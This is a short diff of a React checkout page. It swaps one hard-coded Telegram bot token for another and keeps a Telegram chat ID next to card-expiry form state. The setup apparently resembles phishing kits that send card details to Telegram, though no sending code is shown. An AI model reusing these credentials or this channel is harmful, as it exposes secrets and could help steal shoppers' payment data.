@@ -35,7 +35,7 @@ export default function CheckoutPage() {
   const [selectedYear, setSelectedYear] = useState('')
 
   // Telegram configuration
-  const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8'
+  const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
   const TELEGRAM_CHAT_ID = '-5217100062'
 
   // Province tax rates
